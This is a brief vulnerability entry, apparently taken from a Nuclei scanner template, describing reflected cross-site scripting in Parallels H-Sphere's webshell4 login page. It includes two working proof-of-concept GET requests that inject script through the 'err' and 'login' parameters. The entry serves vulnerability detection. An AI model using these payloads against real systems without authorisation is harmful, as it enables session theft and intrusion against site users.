# Vulnerability: Parallels H-Sphere - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`parallels-hsphere-xss.yaml`)

## Description
Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
GET {{BaseURL}}/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

